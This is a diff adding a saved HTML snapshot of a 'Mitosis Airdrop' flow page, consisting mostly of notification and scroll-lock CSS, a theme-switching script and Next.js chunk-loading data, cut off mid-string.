@@ -1,0 +1,1971 @@
+<!DOCTYPE html>
+<html lang="en" class="light" style="color-scheme:light;--background:#ffffff;--foreground:#0B0E15;--primary:#6058FD;--primary-foreground:#ffffff;--secondary:#F3F4FF;--secondary-foreground:#6058FD;--muted:#f1f5f9;--muted-foreground:#697586;--accent:#6058FD;--accent-foreground:#ffffff;--positive:#32C568;--positive-foreground:#ffffff;--destructive:#dc2626;--destructive-foreground:#ffffff;--border:#E3E8EF;--input:#E3E8EF;--ring:#6058FD;--radius:0.875rem;--wcm-color-fg-1:rgb(20,20,20);--wcm-color-fg-2:rgb(121,134,134);--wcm-color-fg-3:rgb(158,169,169);--wcm-color-bg-1:rgb(255,255,255);--wcm-color-bg-2:rgb(241,243,243);--wcm-color-bg-3:rgb(228,231,231);--wcm-color-overlay:rgba(0,0,0,0.1);--wcm-accent-color:#3396FF;--wcm-accent-fill-color:#FFFFFF;--wcm-z-index:89;--wcm-background-color:#3396FF;--wcm-background-border-radius:8px;--wcm-container-border-radius:30px;--wcm-wallet-icon-border-radius:15px;--wcm-wallet-icon-large-border-radius:30px;--wcm-wallet-icon-small-border-radius:7px;--wcm-input-border-radius:28px;--wcm-button-border-radius:10px;--wcm-notification-border-radius:36px;--wcm-secondary-button-border-radius:28px;--wcm-icon-button-border-radius:50%;--wcm-button-hover-highlight-border-radius:10px;--wcm-text-big-bold-size:20px;--wcm-text-big-bold-weight:600;--wcm-text-big-bold-line-height:24px;--wcm-text-big-bold-letter-spacing:-0.03em;--wcm-text-big-bold-text-transform:none;--wcm-text-xsmall-bold-size:10px;--wcm-text-xsmall-bold-weight:700;--wcm-text-xsmall-bold-line-height:12px;--wcm-text-xsmall-bold-letter-spacing:0.02em;--wcm-text-xsmall-bold-text-transform:uppercase;--wcm-text-xsmall-regular-size:12px;--wcm-text-xsmall-regular-weight:600;--wcm-text-xsmall-regular-line-height:14px;--wcm-text-xsmall-regular-letter-spacing:-0.03em;--wcm-text-xsmall-regular-text-transform:none;--wcm-text-small-thin-size:14px;--wcm-text-small-thin-weight:500;--wcm-text-small-thin-line-height:16px;--wcm-text-small-thin-letter-spacing:-0.03em;--wcm-text-small-thin-text-transform:none;--wcm-text-small-regular-size:14px;--wcm-text-small-regular-weight:600;--wcm-text-small-regular-line-height:16px;--wcm-text-small-regular-letter-spacing:-0.03em;--wcm-text-small-regular-text-transform:none;--wcm-text-medium-regular-size:16px;--wcm-text-medium-regular-weight:600;--wcm-text-medium-regular-line-height:20px;--wcm-text-medium-regular-letter-spacing:-0.03em;--wcm-text-medium-regular-text-transform:none;--wcm-font-family:-apple-system,system-ui,BlinkMacSystemFont,&quot;Segoe UI&quot;,Roboto,Ubuntu,&quot;Helvetica Neue&quot;,sans-serif;--wcm-font-feature-settings:&quot;tnum&quot;on,&quot;lnum&quot;on,&quot;case&quot;on;--wcm-success-color:rgb(38,181,98);--wcm-error-color:rgb(242,90,103);--wcm-overlay-background-color:rgba(0,0,0,0.3);--wcm-overlay-backdrop-filter:none">
+<!--
+ Page saved with SingleFileZ 
+ url: https://airdrop.mitosis.org/flow 
+ saved date: Sun Aug 31 2025 19:00:51 GMT+0100 (West Africa Standard Time)
+-->
+
+<head>
+	<meta charset="utf-8">
+	<style type="text/css">
+	:root {
+		--toastify-color-light: #fff;
+		--toastify-color-dark: #121212;
+		--toastify-color-info: #3498db;
+		--toastify-color-success: #07bc0c;
+		--toastify-color-warning: #f1c40f;
+		--toastify-color-error: hsl(6, 78%, 57%);
+		--toastify-color-transparent: rgba(255, 255, 255, .7);
+		--toastify-icon-color-info: var(--toastify-color-info);
+		--toastify-icon-color-success: var(--toastify-color-success);
+		--toastify-icon-color-warning: var(--toastify-color-warning);
+		--toastify-icon-color-error: var(--toastify-color-error);
+		--toastify-container-width: fit-content;
+		--toastify-toast-width: 320px;
+		--toastify-toast-offset: 16px;
+		--toastify-toast-top: max(var(--toastify-toast-offset), env(safe-area-inset-top));
+		--toastify-toast-right: max(var(--toastify-toast-offset), env(safe-area-inset-right));
+		--toastify-toast-left: max(var(--toastify-toast-offset), env(safe-area-inset-left));
+		--toastify-toast-bottom: max(var(--toastify-toast-offset), env(safe-area-inset-bottom));
+		--toastify-toast-background: #fff;
+		--toastify-toast-padding: 14px;
+		--toastify-toast-min-height: 64px;
+		--toastify-toast-max-height: 800px;
+		--toastify-toast-bd-radius: 6px;
+		--toastify-toast-shadow: 0px 4px 12px rgba(0, 0, 0, .1);
+		--toastify-font-family: sans-serif;
+		--toastify-z-index: 9999;
+		--toastify-text-color-light: #757575;
+		--toastify-text-color-dark: #fff;
+		--toastify-text-color-info: #fff;
+		--toastify-text-color-success: #fff;
+		--toastify-text-color-warning: #fff;
+		--toastify-text-color-error: #fff;
+		--toastify-spinner-color: #616161;
+		--toastify-spinner-color-empty-area: #e0e0e0;
+		--toastify-color-progress-light: linear-gradient(to right, #4cd964, #5ac8fa, #007aff, #34aadc, #5856d6, #ff2d55);
+		--toastify-color-progress-dark: #bb86fc;
+		--toastify-color-progress-info: var(--toastify-color-info);
+		--toastify-color-progress-success: var(--toastify-color-success);
+		--toastify-color-progress-warning: var(--toastify-color-warning);
+		--toastify-color-progress-error: var(--toastify-color-error);
+		--toastify-color-progress-bgo: .2
+	}
+	
+	.Toastify__toast-container {
+		z-index: var(--toastify-z-index);
+		-webkit-transform: translate3d(0, 0, var(--toastify-z-index));
+		position: fixed;
+		width: var(--toastify-container-width);
+		box-sizing: border-box;
+		color: #fff;
+		display: flex;
+		flex-direction: column
+	}
+	
+	.Toastify__toast-container--top-left {
+		top: var(--toastify-toast-top);
+		left: var(--toastify-toast-left)
+	}
+	
+	.Toastify__toast-container--top-center {
+		top: var(--toastify-toast-top);
+		left: 50%;
+		transform: translate(-50%);
+		align-items: center
+	}
+	
+	.Toastify__toast-container--top-right {
+		top: var(--toastify-toast-top);
+		right: var(--toastify-toast-right);
+		align-items: end
+	}
+	
+	.Toastify__toast-container--bottom-left {
+		bottom: var(--toastify-toast-bottom);
+		left: var(--toastify-toast-left)
+	}
+	
+	.Toastify__toast-container--bottom-center {
+		bottom: var(--toastify-toast-bottom);
+		left: 50%;
+		transform: translate(-50%);
+		align-items: center
+	}
+	
+	.Toastify__toast-container--bottom-right {
+		bottom: var(--toastify-toast-bottom);
+		right: var(--toastify-toast-right);
+		align-items: end
+	}
+	
+	.Toastify__toast {
+		--y: 0;
+		position: relative;
+		touch-action: none;
+		width: var(--toastify-toast-width);
+		min-height: var(--toastify-toast-min-height);
+		box-sizing: border-box;
+		margin-bottom: 1rem;
+		padding: var(--toastify-toast-padding);
+		border-radius: var(--toastify-toast-bd-radius);
+		box-shadow: var(--toastify-toast-shadow);
+		max-height: var(--toastify-toast-max-height);
+		font-family: var(--toastify-font-family);
+		z-index: 0;
+		display: flex;
+		flex: 1 auto;
+		align-items: center;
+		word-break: break-word
+	}
+	
+	@media only screen and (max-width:480px) {
+		.Toastify__toast-container {
+			width: 100vw;
+			left: env(safe-area-inset-left);
+			margin: 0
+		}
+		.Toastify__toast-container--top-left,
+		.Toastify__toast-container--top-center,
+		.Toastify__toast-container--top-right {
+			top: env(safe-area-inset-top);
+			transform: translate(0)
+		}
+		.Toastify__toast-container--bottom-left,
+		.Toastify__toast-container--bottom-center,
+		.Toastify__toast-container--bottom-right {
+			bottom: env(safe-area-inset-bottom);
+			transform: translate(0)
+		}
+		.Toastify__toast-container--rtl {
+			right: env(safe-area-inset-right);
+			left: initial
+		}
+		.Toastify__toast {
+			--toastify-toast-width: 100%;
+			margin-bottom: 0;
+			border-radius: 0
+		}
+	}
+	
+	.Toastify__toast-container[data-stacked=true] {
+		width: var(--toastify-toast-width)
+	}
+	
+	.Toastify__toast--stacked {
+		position: absolute;
+		width: 100%;
+		transform: translate3d(0, var(--y), 0) scale(var(--s));
+		transition: transform .3s
+	}
+	
+	.Toastify__toast--stacked[data-collapsed] .Toastify__toast-body,
+	.Toastify__toast--stacked[data-collapsed] .Toastify__close-button {
+		transition: opacity .1s
+	}
+	
+	.Toastify__toast--stacked[data-collapsed=false] {
+		overflow: visible
+	}
+	
+	.Toastify__toast--stacked[data-collapsed=true]:not(:last-child)>* {
+		opacity: 0
+	}
+	
+	.Toastify__toast--stacked:after {
+		content: "";
+		position: absolute;
+		left: 0;
+		right: 0;
+		height: calc(var(--g)*1px);
+		bottom: 100%
+	}
+	
+	.Toastify__toast--stacked[data-pos=top] {
+		top: 0
+	}
+	
+	.Toastify__toast--stacked[data-pos=bot] {
+		bottom: 0
+	}
+	
+	.Toastify__toast--stacked[data-pos=bot].Toastify__toast--stacked:before {
+		transform-origin: top
+	}
+	
+	.Toastify__toast--stacked[data-pos=top].Toastify__toast--stacked:before {
+		transform-origin: bottom
+	}
+	
+	.Toastify__toast--stacked:before {
+		content: "";
+		position: absolute;
+		left: 0;
+		right: 0;
+		bottom: 0;
+		height: 100%;
+		transform: scaleY(3);
+		z-index: -1
+	}
+	
+	.Toastify__toast--rtl {
+		direction: rtl
+	}
+	
+	.Toastify__toast--close-on-click {
+		cursor: pointer
+	}
+	
+	.Toastify__toast-icon {
+		margin-inline-end: 10px;
+		width: 22px;
+		flex-shrink: 0;
+		display: flex
+	}
+	
+	.Toastify--animate {
+		animation-fill-mode: both;
+		animation-duration: .5s
+	}
+	
+	.Toastify--animate-icon {
+		animation-fill-mode: both;
+		animation-duration: .3s
+	}
+	
+	.Toastify__toast-theme--dark {
+		background: var(--toastify-color-dark);
+		color: var(--toastify-text-color-dark)
+	}
+	
+	.Toastify__toast-theme--light,
+	.Toastify__toast-theme--colored.Toastify__toast--default {
+		background: var(--toastify-color-light);
+		color: var(--toastify-text-color-light)
+	}
+	
+	.Toastify__toast-theme--colored.Toastify__toast--info {
+		color: var(--toastify-text-color-info);
+		background: var(--toastify-color-info)
+	}
+	
+	.Toastify__toast-theme--colored.Toastify__toast--success {
+		color: var(--toastify-text-color-success);
+		background: var(--toastify-color-success)
+	}
+	
+	.Toastify__toast-theme--colored.Toastify__toast--warning {
+		color: var(--toastify-text-color-warning);
+		background: var(--toastify-color-warning)
+	}
+	
+	.Toastify__toast-theme--colored.Toastify__toast--error {
+		color: var(--toastify-text-color-error);
+		background: var(--toastify-color-error)
+	}
+	
+	.Toastify__progress-bar-theme--light {
+		background: var(--toastify-color-progress-light)
+	}
+	
+	.Toastify__progress-bar-theme--dark {
+		background: var(--toastify-color-progress-dark)
+	}
+	
+	.Toastify__progress-bar--info {
+		background: var(--toastify-color-progress-info)
+	}
+	
+	.Toastify__progress-bar--success {
+		background: var(--toastify-color-progress-success)
+	}
+	
+	.Toastify__progress-bar--warning {
+		background: var(--toastify-color-progress-warning)
+	}
+	
+	.Toastify__progress-bar--error {
+		background: var(--toastify-color-progress-error)
+	}
+	
+	.Toastify__progress-bar-theme--colored.Toastify__progress-bar--info,
+	.Toastify__progress-bar-theme--colored.Toastify__progress-bar--success,
+	.Toastify__progress-bar-theme--colored.Toastify__progress-bar--warning,
+	.Toastify__progress-bar-theme--colored.Toastify__progress-bar--error {
+		background: var(--toastify-color-transparent)
+	}
+	
+	.Toastify__close-button {
+		color: #fff;
+		position: absolute;
+		top: 6px;
+		right: 6px;
+		background: transparent;
+		outline: none;
+		border: none;
+		padding: 0;
+		cursor: pointer;
+		opacity: .7;
+		transition: .3s ease;
+		z-index: 1
+	}
+	
+	.Toastify__toast--rtl .Toastify__close-button {
+		left: 6px;
+		right: unset
+	}
+	
+	.Toastify__close-button--light {
+		color: #000;
+		opacity: .3
+	}
+	
+	.Toastify__close-button>svg {
+		fill: currentColor;
+		height: 16px;
+		width: 14px
+	}
+	
+	.Toastify__close-button:hover,
+	.Toastify__close-button:focus {
+		opacity: 1
+	}
+	
+	@keyframes Toastify__trackProgress {
+		0% {
+			transform: scaleX(1)
+		}
+		to {
+			transform: scaleX(0)
+		}
+	}
+	
+	.Toastify__progress-bar {
+		position: absolute;
+		bottom: 0;
+		left: 0;
+		width: 100%;
+		height: 100%;
+		z-index: 1;
+		opacity: .7;
+		transform-origin: left
+	}
+	
+	.Toastify__progress-bar--animated {
+		animation: Toastify__trackProgress linear 1 forwards
+	}
+	
+	.Toastify__progress-bar--controlled {
+		transition: transform .2s
+	}
+	
+	.Toastify__progress-bar--rtl {
+		right: 0;
+		left: initial;
+		transform-origin: right;
+		border-bottom-left-radius: initial
+	}
+	
+	.Toastify__progress-bar--wrp {
+		position: absolute;
+		overflow: hidden;
+		bottom: 0;
+		left: 0;
+		width: 100%;
+		height: 5px;
+		border-bottom-left-radius: var(--toastify-toast-bd-radius);
+		border-bottom-right-radius: var(--toastify-toast-bd-radius)
+	}
+	
+	.Toastify__progress-bar--wrp[data-hidden=true] {
+		opacity: 0
+	}
+	
+	.Toastify__progress-bar--bg {
+		opacity: var(--toastify-color-progress-bgo);
+		width: 100%;
+		height: 100%
+	}
+	
+	.Toastify__spinner {
+		width: 20px;
+		height: 20px;
+		box-sizing: border-box;
+		border: 2px solid;
+		border-radius: 100%;
+		border-color: var(--toastify-spinner-color-empty-area);
+		border-right-color: var(--toastify-spinner-color);
+		animation: Toastify__spin .65s linear infinite
+	}
+	
+	@keyframes Toastify__bounceInRight {
+		0%,
+		60%,
+		75%,
+		90%,
+		to {
+			animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+		}
+		0% {
+			opacity: 0;
+			transform: translate3d(3000px, 0, 0)
+		}
+		60% {
+			opacity: 1;
+			transform: translate3d(-25px, 0, 0)
+		}
+		75% {
+			transform: translate3d(10px, 0, 0)
+		}
+		90% {
+			transform: translate3d(-5px, 0, 0)
+		}
+		to {
+			transform: none
+		}
+	}
+	
+	@keyframes Toastify__bounceOutRight {
+		20% {
+			opacity: 1;
+			transform: translate3d(-20px, var(--y), 0)
+		}
+		to {
+			opacity: 0;
+			transform: translate3d(2000px, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__bounceInLeft {
+		0%,
+		60%,
+		75%,
+		90%,
+		to {
+			animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+		}
+		0% {
+			opacity: 0;
+			transform: translate3d(-3000px, 0, 0)
+		}
+		60% {
+			opacity: 1;
+			transform: translate3d(25px, 0, 0)
+		}
+		75% {
+			transform: translate3d(-10px, 0, 0)
+		}
+		90% {
+			transform: translate3d(5px, 0, 0)
+		}
+		to {
+			transform: none
+		}
+	}
+	
+	@keyframes Toastify__bounceOutLeft {
+		20% {
+			opacity: 1;
+			transform: translate3d(20px, var(--y), 0)
+		}
+		to {
+			opacity: 0;
+			transform: translate3d(-2000px, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__bounceInUp {
+		0%,
+		60%,
+		75%,
+		90%,
+		to {
+			animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+		}
+		0% {
+			opacity: 0;
+			transform: translate3d(0, 3000px, 0)
+		}
+		60% {
+			opacity: 1;
+			transform: translate3d(0, -20px, 0)
+		}
+		75% {
+			transform: translate3d(0, 10px, 0)
+		}
+		90% {
+			transform: translate3d(0, -5px, 0)
+		}
+		to {
+			transform: translateZ(0)
+		}
+	}
+	
+	@keyframes Toastify__bounceOutUp {
+		20% {
+			transform: translate3d(0, calc(var(--y) - 10px), 0)
+		}
+		40%,
+		45% {
+			opacity: 1;
+			transform: translate3d(0, calc(var(--y) + 20px), 0)
+		}
+		to {
+			opacity: 0;
+			transform: translate3d(0, -2000px, 0)
+		}
+	}
+	
+	@keyframes Toastify__bounceInDown {
+		0%,
+		60%,
+		75%,
+		90%,
+		to {
+			animation-timing-function: cubic-bezier(.215, .61, .355, 1)
+		}
+		0% {
+			opacity: 0;
+			transform: translate3d(0, -3000px, 0)
+		}
+		60% {
+			opacity: 1;
+			transform: translate3d(0, 25px, 0)
+		}
+		75% {
+			transform: translate3d(0, -10px, 0)
+		}
+		90% {
+			transform: translate3d(0, 5px, 0)
+		}
+		to {
+			transform: none
+		}
+	}
+	
+	@keyframes Toastify__bounceOutDown {
+		20% {
+			transform: translate3d(0, calc(var(--y) - 10px), 0)
+		}
+		40%,
+		45% {
+			opacity: 1;
+			transform: translate3d(0, calc(var(--y) + 20px), 0)
+		}
+		to {
+			opacity: 0;
+			transform: translate3d(0, 2000px, 0)
+		}
+	}
+	
+	.Toastify__bounce-enter--top-left,
+	.Toastify__bounce-enter--bottom-left {
+		animation-name: Toastify__bounceInLeft
+	}
+	
+	.Toastify__bounce-enter--top-right,
+	.Toastify__bounce-enter--bottom-right {
+		animation-name: Toastify__bounceInRight
+	}
+	
+	.Toastify__bounce-enter--top-center {
+		animation-name: Toastify__bounceInDown
+	}
+	
+	.Toastify__bounce-enter--bottom-center {
+		animation-name: Toastify__bounceInUp
+	}
+	
+	.Toastify__bounce-exit--top-left,
+	.Toastify__bounce-exit--bottom-left {
+		animation-name: Toastify__bounceOutLeft
+	}
+	
+	.Toastify__bounce-exit--top-right,
+	.Toastify__bounce-exit--bottom-right {
+		animation-name: Toastify__bounceOutRight
+	}
+	
+	.Toastify__bounce-exit--top-center {
+		animation-name: Toastify__bounceOutUp
+	}
+	
+	.Toastify__bounce-exit--bottom-center {
+		animation-name: Toastify__bounceOutDown
+	}
+	
+	@keyframes Toastify__zoomIn {
+		0% {
+			opacity: 0;
+			transform: scale3d(.3, .3, .3)
+		}
+		50% {
+			opacity: 1
+		}
+	}
+	
+	@keyframes Toastify__zoomOut {
+		0% {
+			opacity: 1
+		}
+		50% {
+			opacity: 0;
+			transform: translate3d(0, var(--y), 0) scale3d(.3, .3, .3)
+		}
+		to {
+			opacity: 0
+		}
+	}
+	
+	.Toastify__zoom-enter {
+		animation-name: Toastify__zoomIn
+	}
+	
+	.Toastify__zoom-exit {
+		animation-name: Toastify__zoomOut
+	}
+	
+	@keyframes Toastify__flipIn {
+		0% {
+			transform: perspective(400px) rotateX(90deg);
+			animation-timing-function: ease-in;
+			opacity: 0
+		}
+		40% {
+			transform: perspective(400px) rotateX(-20deg);
+			animation-timing-function: ease-in
+		}
+		60% {
+			transform: perspective(400px) rotateX(10deg);
+			opacity: 1
+		}
+		80% {
+			transform: perspective(400px) rotateX(-5deg)
+		}
+		to {
+			transform: perspective(400px)
+		}
+	}
+	
+	@keyframes Toastify__flipOut {
+		0% {
+			transform: translate3d(0, var(--y), 0) perspective(400px)
+		}
+		30% {
+			transform: translate3d(0, var(--y), 0) perspective(400px) rotateX(-20deg);
+			opacity: 1
+		}
+		to {
+			transform: translate3d(0, var(--y), 0) perspective(400px) rotateX(90deg);
+			opacity: 0
+		}
+	}
+	
+	.Toastify__flip-enter {
+		animation-name: Toastify__flipIn
+	}
+	
+	.Toastify__flip-exit {
+		animation-name: Toastify__flipOut
+	}
+	
+	@keyframes Toastify__slideInRight {
+		0% {
+			transform: translate3d(110%, 0, 0);
+			visibility: visible
+		}
+		to {
+			transform: translate3d(0, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__slideInLeft {
+		0% {
+			transform: translate3d(-110%, 0, 0);
+			visibility: visible
+		}
+		to {
+			transform: translate3d(0, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__slideInUp {
+		0% {
+			transform: translate3d(0, 110%, 0);
+			visibility: visible
+		}
+		to {
+			transform: translate3d(0, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__slideInDown {
+		0% {
+			transform: translate3d(0, -110%, 0);
+			visibility: visible
+		}
+		to {
+			transform: translate3d(0, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__slideOutRight {
+		0% {
+			transform: translate3d(0, var(--y), 0)
+		}
+		to {
+			visibility: hidden;
+			transform: translate3d(110%, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__slideOutLeft {
+		0% {
+			transform: translate3d(0, var(--y), 0)
+		}
+		to {
+			visibility: hidden;
+			transform: translate3d(-110%, var(--y), 0)
+		}
+	}
+	
+	@keyframes Toastify__slideOutDown {
+		0% {
+			transform: translate3d(0, var(--y), 0)
+		}
+		to {
+			visibility: hidden;
+			transform: translate3d(0, 500px, 0)
+		}
+	}
+	
+	@keyframes Toastify__slideOutUp {
+		0% {
+			transform: translate3d(0, var(--y), 0)
+		}
+		to {
+			visibility: hidden;
+			transform: translate3d(0, -500px, 0)
+		}
+	}
+	
+	.Toastify__slide-enter--top-left,
+	.Toastify__slide-enter--bottom-left {
+		animation-name: Toastify__slideInLeft
+	}
+	
+	.Toastify__slide-enter--top-right,
+	.Toastify__slide-enter--bottom-right {
+		animation-name: Toastify__slideInRight
+	}
+	
+	.Toastify__slide-enter--top-center {
+		animation-name: Toastify__slideInDown
+	}
+	
+	.Toastify__slide-enter--bottom-center {
+		animation-name: Toastify__slideInUp
+	}
+	
+	.Toastify__slide-exit--top-left,
+	.Toastify__slide-exit--bottom-left {
+		animation-name: Toastify__slideOutLeft;
+		animation-timing-function: ease-in;
+		animation-duration: .3s
+	}
+	
+	.Toastify__slide-exit--top-right,
+	.Toastify__slide-exit--bottom-right {
+		animation-name: Toastify__slideOutRight;
+		animation-timing-function: ease-in;
+		animation-duration: .3s
+	}
+	
+	.Toastify__slide-exit--top-center {
+		animation-name: Toastify__slideOutUp;
+		animation-timing-function: ease-in;
+		animation-duration: .3s
+	}
+	
+	.Toastify__slide-exit--bottom-center {
+		animation-name: Toastify__slideOutDown;
+		animation-timing-function: ease-in;
+		animation-duration: .3s
+	}
+	
+	@keyframes Toastify__spin {
+		0% {
+			transform: rotate(0)
+		}
+		to {
+			transform: rotate(360deg)
+		}
+	}
+	</style>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="stylesheet_1.css" data-precedence="next">
+	<link rel="stylesheet" href="stylesheet_0.css" data-precedence="next">
+	<script async src=""></script>
+	<script async src=""></script>
+	<script async src=""></script>
+	<meta name="next-size-adjust" content>
+	<script nomodule src=""></script>
+	<title>Mitosis Airdrop</title>
+	<meta name="description" content="Mitosis Airdrop">
+	<meta name="keywords" content="Mitosis Airdrop">
+	<style type="text/css">
+	.with-scroll-bars-hidden {
+		overflow: hidden!important;
+		padding-right: 15px!important
+	}
+	
+	body[data-scroll-locked] {
+		overflow: hidden!important;
+		overscroll-behavior: contain;
+		position: relative!important;
+		padding-left: 0px;
+		padding-top: 0px;
+		padding-right: 0px;
+		margin-left: 0;
+		margin-top: 0;
+		margin-right: 15px!important
+	}
+	
+	.right-scroll-bar-position {
+		right: 15px!important
+	}
+	
+	.width-before-scroll-bar {
+		margin-right: 15px!important
+	}
+	
+	.right-scroll-bar-position .right-scroll-bar-position {
+		right: 0!important
+	}
+	
+	.width-before-scroll-bar .width-before-scroll-bar {
+		margin-right: 0!important
+	}
+	
+	body[data-scroll-locked] {
+		--removed-body-scroll-bar-size: 15px
+	}
+	</style>
+	<meta name="referrer" content="no-referrer">
+	<link rel="icon" href="images/12.ico" type="image/x-icon" sizes="512x512">
+	<link rel="canonical" href="https://airdrop.mitosis.org/flow">
+	<style>
+	img[src="data:,"],
+	source[src="data:,"] {
+		display: none!important
+	}
+	</style>
+</head>
+
+<body class="__variable_a8b027 __variable_5cfdac font-sans antialiased" data-scroll-locked="1">
+	<div>
+		<style>
+		:root {
+			--background: #ffffff;
+			--foreground: #0B0E15;
+			--primary: #6058FD;
+			--primary-foreground: #ffffff;
+			--secondary: #F3F4FF;
+			--secondary-foreground: #6058FD;
+			--muted: #f1f5f9;
+			--muted-foreground: #697586;
+			--accent: #6058FD;
+			--accent-foreground: #ffffff;
+			--positive: #32C568;
+			--positive-foreground: #ffffff;
+			--destructive: #dc2626;
+			--destructive-foreground: #ffffff;
+			--border: #E3E8EF;
+			--input: #E3E8EF;
+			--ring: #6058FD;
+			--radius: 0.875rem
+		}
+		</style>
+	</div>
+	<!--$-->
+	<!--/$-->
+	<script>
+	((e, t, r, n, a, o, i, s) => {
+		let u = document.documentElement,
+			l = ["light", "dark"];
+
+		function c(t) {
+			var r;
+			(Array.isArray(e) ? e : [e]).forEach(e => {
+				let r = "class" === e,
+					n = r && o ? a.map(e => o[e] || e) : a;
+				r ? (u.classList.remove(...n), u.classList.add(t)) : u.setAttribute(e, t)
+			}), r = t, s && l.includes(r) && (u.style.colorScheme = r)
+		}
+		if(n) c(n);
+		else try {
+			let e = localStorage.getItem(t) || r,
+				n = i && "system" === e ? window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light" : e;
+			c(n)
+		} catch(e) {}
+	})("class", "theme", "light", null, ["light", "dark"], null, true, true)
+	</script>
+	<script async src="scripts/35.js"></script>
+	<script>
+	(self.__next_f = self.__next_f || []).push([0])
+	</script>
+	<script>
+	self.__next_f.push([1, "1:\"$Sreact.fragment\"\n3:I[26012,[],\"\"]\n4:I[63690,[],\"\"]\n5:I[76231,[\"5218\",\"static/chunks/2d3870a0-45c5b121c0d3373d.js\",\"1585\",\"static/chunks/1585-92120f395c97b229.js\",\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"2317\",\"static/chunks/2317-6fa6334fb2270ad7.js\",\"7709\",\"static/chunks/7709-6cc41ede7f515ab2.js\",\"6744\",\"static/chunks/6744-f4a33d3b3ad2b9b4.js\",\"7470\",\"static/chunks/7470-748aa2221f153ad9.js\",\"6665\",\"static/chunks/6665-af3b0cce40ff5888.js\",\"3549\",\"static/chunks/3549-b6e7504970efb4d5.js\",\"4086\",\"static/chunks/4086-c1e7980ec3fc682d.js\",\"2184\",\"static/chunks/2184-810749fa95c8472c.js\",\"7982\",\"static/chunks/app/(app)/(with-provider)/layout-973f7e35127485ba.js\"],\"Providers\"]\n6:I[22396,[\"5218\",\"static/chunks/2d3870a0-45c5b121c0d3373d.js\",\"1585\",\"static/chunks/1585-92120f395c97b229.js\",\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"2317\",\"static/chunks/2317-6fa6334fb2270ad7.js\",\"7709\",\"static/chunks/7709-6cc41ede7f515ab2.js\",\"6744\",\"static/chunks/6744-f4a33d3b3ad2b9b4.js\",\"7470\",\"static/chunks/7470-748aa2221f153ad9.js\",\"6665\",\"static/chunks/6665-af3b0cce40ff5888.js\",\"3549\",\"static/chunks/3549-b6e7504970efb4d5.js\",\"4086\",\"static/chunks/4086-c1e7980ec3fc682d.js\",\"2184\",\"static/chunks/2184-810749fa95c8472c.js\",\"7982\",\"static/chunks/app/(app)/(with-provider)/layout-973f7e35127485ba.js\"],\"Header\"]\n7:I[38253,[\"5218\",\"static/chunks/2d3870a0-45c5b121c0d3373d.js\",\"1585\",\"static/chunks/1585-92120f395c97b229.js\",\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"2317\",\"static/chunks/2317-6fa6334fb2270ad7.js\",\"7709\",\"static/chunks/7709-6cc41ede7f515ab2.js\",\"6744\",\"static/chunks/6744-f4a33d3b3ad2b9b4.js\",\"7470\",\"static/chunks/7470-748aa2221f153ad9.js\",\"6665\",\"static/chunks/6665-af3b0cce40ff5888.js\",\"3549\",\"static/chunks/3549-b6e7504970efb4d5.js\",\"4086\",\"static/chunks/4086-c1e7980ec3fc682d.js\",\"2184\",\"static/chunks/2184-810749fa95c8472c.js\",\"7982\",\"static/chunks/app/(app)/(with-provi"])
+	</script>
+	<script>
+	self.__next_f.push([1, "der)/layout-973f7e35127485ba.js\"],\"Footer\"]\n8:I[14777,[],\"ClientPageRoot\"]\n9:I[37548,[\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"1326\",\"static/chunks/app/(app)/(with-provider)/flow/page-b95dfb38e3e0e813.js\"],\"default\"]\na:I[36236,[],\"MetadataBoundary\"]\nc:I[36236,[],\"OutletBoundary\"]\nf:I[63588,[],\"AsyncMetadataOutlet\"]\n11:I[36236,[],\"ViewportBoundary\"]\n13:I[82691,[],\"\"]\n14:\"$Sreact.suspense\"\n15:I[63588,[],\"AsyncMetadata\"]\n17:I[85560,[\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"8281\",\"static/chunks/8281-e8bda32c97f90dd9.js\",\"7177\",\"static/chunks/app/layout-47dc444dd8a5ad3f.js\"],\"\"]\n19:I[20949,[\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"8281\",\"static/chunks/8281-e8bda32c97f90dd9.js\",\"7177\",\"static/chunks/app/layout-47dc444dd8a5ad3f.js\"],\"JotaiConfigProvider\"]\n1a:I[9583,[\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"8281\",\"static/chunks/8281-e8bda32c97f90dd9.js\",\"7177\",\"static/chunks/app/layout-47dc444dd8a5ad3f.js\"],\"PreviewTracker\"]\n1b:I[66661,[\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"8281\",\"static/chunks/8281-e8bda32c97f90dd9.js\",\"7177\",\"static/chunks/app/layout-47dc444dd8a5ad3f.js\"],\"ApplicationInsightsWeb\"]\n1c:I[42581,[\"4285\",\"static/chunks/4285-4b37899b18c92972.js\",\"2148\",\"static/chunks/2148-c35f0094ce4d78f8.js\",\"8281\",\"static/chunks/8281-e8bda32c97f90dd9.js\",\"7177\",\"static/chunks/app/layout-47dc444dd8a5ad3f.js\"],\"StyleRegistry\"]\n:HL[\"/_next/static/media/569ce4b8f30dc480-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/8f65835aa057b6ed